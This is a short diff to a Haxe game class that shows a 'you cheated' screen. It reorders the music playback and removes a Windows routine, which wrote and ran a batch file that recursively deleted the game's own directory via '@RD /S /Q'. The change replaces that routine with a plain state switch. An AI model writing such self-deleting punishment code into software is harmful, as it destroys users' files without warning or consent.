@@ -21,10 +21,12 @@ class YouCheatedSomeoneIsComing extends MusicBeatState
 	override public function create():Void 
 	{
 		super.create();
+		if(FlxG.sound.music != null)
+			FlxG.sound.music.stop();
+		FlxG.sound.playMusic(Paths.music('badEnding'),1,true);
 		var spooky:FlxSprite = new FlxSprite(0, 0).loadGraphic('dave/cheater_lol');
         spooky.screenCenter();
         add(spooky);
-		FlxG.sound.playMusic(Paths.music('badEnding'),1,true);
 	}
 	
 	override public function update(elapsed:Float):Void 
@@ -33,27 +35,14 @@ class YouCheatedSomeoneIsComing extends MusicBeatState
 		
 		if (FlxG.keys.pressed.ENTER)
 		{
-			#if release
 			endIt();
-			#else
-			FlxG.switchState(new SusState());
-			#end
 		}
 		
 	}
 	
-	
 	public function endIt()
 	{
-        #if windows
-		// make a batch file that will delete the game, run the batch file, then close the game
-		var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
-		File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
-		new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
-		Sys.exit(0);
-        #else
         FlxG.switchState(new SusState());
-        #end
 	}
 	
 }
